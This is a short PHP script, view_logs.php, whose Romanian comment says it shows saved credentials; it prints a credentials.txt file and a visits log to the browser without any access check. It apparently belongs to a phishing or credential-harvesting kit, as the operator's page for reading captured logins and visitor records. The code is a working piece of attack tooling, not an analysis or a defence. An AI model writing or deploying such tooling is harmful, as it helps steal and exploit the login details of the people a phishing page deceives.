<?php
// view_logs.php - Vezi credentialele salvate

echo "<pre>";
if (file_exists('credentials.txt')) {
    echo file_get_contents('credentials.txt');
} else {
    echo "No credentials yet.";
}
echo "\n\n--- VISITS LOG ---\n";
if (file_exists('visits.log')) {
    echo file_get_contents('visits.log');
} else {
    echo "No visits logged.";
}
echo "</pre>";
?>